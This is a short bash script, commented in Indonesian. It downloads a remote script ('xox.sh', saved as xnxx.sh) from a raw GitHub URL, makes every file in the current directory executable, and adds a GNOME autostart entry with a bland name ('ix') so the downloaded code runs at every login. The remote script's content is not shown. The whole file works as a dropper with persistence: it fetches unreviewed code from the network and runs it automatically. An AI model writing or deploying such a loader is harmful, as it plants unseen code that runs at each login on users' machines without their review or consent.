#!/bin/bash

# Script
 rm -rvf xnxx.sh; wget -O xnxx.sh https://raw.githubusercontent.com/Maulana021k/xnxx/refs/heads/main/xox.sh; chmod +x *

# Nama file .desktop
DESKTOP_FILE="$HOME/.config/autostart/ix.desktop"

# Pastikan direktori autostart ada
mkdir -p "$HOME/.config/autostart"

# Buat file .desktop
cat <<EOF > "$DESKTOP_FILE"
[Desktop Entry]
Type=Application
Exec=/home/user/xnxx.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=ix
Comment=ix
EOF

# Ubah permission agar bisa dieksekusi (tidak wajib, tapi bisa membantu debugging)
chmod +x "$DESKTOP_FILE"

echo "Startup entry created at $DESKTOP_FILE"
